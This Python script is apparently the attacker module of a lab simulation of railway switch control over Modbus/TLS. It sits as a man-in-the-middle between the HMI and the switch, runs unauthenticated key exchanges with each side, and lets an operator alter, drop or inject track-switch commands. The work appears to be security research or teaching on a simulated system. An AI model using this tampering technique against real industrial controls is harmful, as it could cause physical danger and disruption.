import asyncio
import hashlib
import hmac
import os
import base64
import secrets

from pymodbus import __version__ as pymodbus_version
from pymodbus.datastore import (
    ModbusSequentialDataBlock,
    ModbusServerContext,
    ModbusSlaveContext,
)
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.transaction import ModbusTlsFramer
from pymodbus.server import StartAsyncTlsServer
from pymodbus.client import AsyncModbusTlsClient
from pymodbus.exceptions import ModbusException

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.fernet import Fernet

recv_queue = asyncio.Queue()
send_queue = asyncio.Queue()
switch_key = b""
hmi_key = b""
client = None

cert = os.path.join(os.path.dirname(os.getcwd()), "simulation/TLS/attack_cert.pem")
key = os.path.join(os.path.dirname(os.getcwd()), "simulation/TLS/attack_key.pem")

datastore_size = 95

switch_cache = 1
drop_next = False
change_next = False
change_value = -1
send_new_key = asyncio.Event()


async def connect_to_switch() -> None:
    global switch_key

    while True:
        try:
            reader_switch, writer_switch = await asyncio.open_connection('localhost', 5010)
            break  # Break out of the loop if connection is successful
        except Exception as e:
            await asyncio.sleep(1)  # Wait for a while before retrying

    p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
    g = 2

    params_numbers = dh.DHParameterNumbers(p, g)
    parameters = params_numbers.parameters(default_backend())

    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()

    public_key_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    writer_switch.write(public_key_bytes)
    await writer_switch.drain()

    public_key_bytes = await reader_switch.read(2048)

    public_key = serialization.load_pem_public_key(public_key_bytes, backend=default_backend())

    shared_secret = private_key.exchange(public_key)

    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'handshake data',
    ).derive(shared_secret)

    switch_key = base64.urlsafe_b64encode(derived_key)

    while True:
        await send_new_key.wait()

        new_key = Fernet.generate_key()

        cipher = Fernet(switch_key)
        encrypted_key = cipher.encrypt(new_key)

        writer_switch.write(encrypted_key)
        await writer_switch.drain()


async def server_for_hmi() -> None:
    async def receive_key(reader: asyncio.StreamReader,
                          writer: asyncio.StreamWriter) -> None:
        global hmi_key

        p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        g = 2

        params_numbers = dh.DHParameterNumbers(p, g)
        parameters = params_numbers.parameters(default_backend())

        private_key = parameters.generate_private_key()
        public_key = private_key.public_key()

        public_key_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        recv_public_key = await reader.read(2048)

        writer.write(public_key_bytes)
        await writer.drain()

        recv_public_key = serialization.load_pem_public_key(recv_public_key, backend=default_backend())

        shared_secret = private_key.exchange(recv_public_key)

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'handshake data',
        ).derive(shared_secret)

        hmi_key = base64.urlsafe_b64encode(derived_key)

        while True:
            data = await reader.read(2048)

            cipher = Fernet(hmi_key)
            hmi_key = cipher.decrypt(data)
            send_new_key.set()

    server = await asyncio.start_server(receive_key, "localhost", 12344)  # tcp to hmi
    async with server:
        await server.serve_forever()


async def client_for_hmi() -> None:
    async def run_client() -> None:
        """Run client"""
        global client

        client = AsyncModbusTlsClient(
            "localhost",
            port=12345,  # modbus to hmi
            framer=ModbusTlsFramer,
            certfile=cert,
            keyfile=key,
            server_hostname="host",
        )

        await client.connect()
        # if we can't connect try again after 5 seconds, if the server hasn't been started yet
        while not client.connected:
            await asyncio.sleep(5)
            await client.connect()

        # Write confirmation to server that we are active
        await client.write_register(datastore_size - 2, 1, slave=1)

    async def read_holding_register() -> None:
        """Reads data from holding register"""
        global client
        global highest_data_id

        try:
            while True:
                # poll the flag bit to see if new information has been written
                hold_register = await client.read_holding_registers(datastore_size - 2, 1, slave=1)

                if hold_register.registers == [0]:
                    hold_register = await client.read_holding_registers(0x00, datastore_size - 3, slave=1)

                    if not hold_register.isError():
                        amount_to_read = hold_register.registers[1]

                        received_data = "".join(chr(char) for char in hold_register.registers[2:2 + amount_to_read + 1
                                                                                                + 2 + 1 + 64])

                        nonce = received_data[1 + amount_to_read:1 + amount_to_read + 2]
                        data = received_data[:amount_to_read].split(" ")

                        if data[0] == "X":
                            await recv_queue.put(int(data[1]))

                            nonce = [ord(char) for char in nonce]
                            calc_signature = hmac.new(hmi_key, str(nonce).encode(), hashlib.sha256).hexdigest()

                            calc_signature = [ord(char) for char in calc_signature]

                            await client.write_registers(0x00, calc_signature, slave=1)
                        elif data[0] == "Y":
                            data_to_send = [switch_cache] + [ord(char) for char in nonce]

                            calc_signature = hmac.new(hmi_key, str(data_to_send).encode(),
                                                      hashlib.sha256).hexdigest()

                            calc_signature = [switch_cache] + [ord(char) for char in calc_signature]

                            await client.write_registers(0x00, calc_signature, slave=1)

                        await client.write_register(datastore_size - 2, 1, slave=1)
                await asyncio.sleep(0.5)
        except ModbusException as exc:
            client.close()

    loop = asyncio.get_event_loop()
    loop.create_task(run_client())

    await asyncio.sleep(5)
    await read_holding_register()


def setup_server() -> ModbusServerContext:
    """Generates our holding register for the server"""
    # global context
    datablock = ModbusSequentialDataBlock(0x00, [0] * datastore_size)
    context = ModbusSlaveContext(
        di=datablock, co=datablock, hr=datablock, ir=datablock)
    context = ModbusServerContext(slaves=context, single=True)

    return context


async def server_for_switch(context: ModbusServerContext) -> None:
    """Creates the server that will listen at localhost"""

    identity = ModbusDeviceIdentification(
        info_name={
            "VendorName": "Pymodbus",
            "ProductCode": "PM",
            "VendorUrl": "https://github.com/pymodbus-dev/pymodbus/",
            "ProductName": "Pymodbus Server",
            "ModelName": "Pymodbus Server",
            "MajorMinorRevision": pymodbus_version,
        }
    )

    address = ("localhost", 5002)

    await StartAsyncTlsServer(
        context=context,
        host="host",
        identity=identity,
        address=address,
        framer=ModbusTlsFramer,
        certfile=cert,
        keyfile=key,
    )


async def send_switch_update() -> None:
    sequence_number = 0

    while True:
        data = await send_queue.get()

        sequence_number += 1
        temp_signature = data + str(sequence_number)
        temp_signature = hmac.new(switch_key, temp_signature.encode(), hashlib.sha256).hexdigest()
        while True:
            # Generate 2 bytes
            nonce = [char for char in secrets.token_bytes(2)]

            # Check if any character is a space
            if b' ' not in nonce:
                break

        data_to_send = (
                [sequence_number] + [len(data)] + [ord(char) for char in data] + [32] + nonce +
                [32] + [ord(char) for char in temp_signature])

        context[0x00].setValues(3, 0x00, data_to_send)
        context[0x00].setValues(3, datastore_size - 2, [0])


async def change_packet() -> None:
    global switch_cache
    global change_next
    global change_value
    global drop_next

    while True:
        data = await recv_queue.get()

        if change_next:
            data = change_value
            change_next = False
        elif drop_next:
            drop_next = False
            continue

        switch_cache = data

        data = "X " + str(data)

        # data in format "X 4"
        await send_queue.put(data)


async def packet_input() -> None:
    global change_value
    global change_next
    global drop_next

    while True:
        os.system('clear')
        print("""        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣄⠀⢰⡇⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣾⡇⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⣠⡾⠟⠁⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠁⠴⠶⢶⣶⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⢀⣀⣈⠙⣿⡿⠟⠁⠀⠀⠀⠀⠀⠙⢷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠘⢿⣿⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")

        user_input = await asyncio.to_thread(input, "1. Change next available switch package, include track number \n"
                                                    "2. Drop the next package\n"
                                                    "3. Create new switch request, include track number\n"
                                                    "Input: ")

        user_input = user_input.split(' ')

        if int(user_input[0]) == 1:
            change_next = True
            change_value = int(user_input[1])
        elif int(user_input[0]) == 2:
            drop_next = True
        else:
            await recv_queue.put(int(user_input[1]))


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(server_for_hmi())
    context = setup_server()
    loop.create_task(server_for_switch(context))
    loop.create_task(connect_to_switch())
    loop.create_task(send_switch_update())
    loop.create_task(change_packet())
    loop.create_task(packet_input())
    loop.run_until_complete(client_for_hmi())
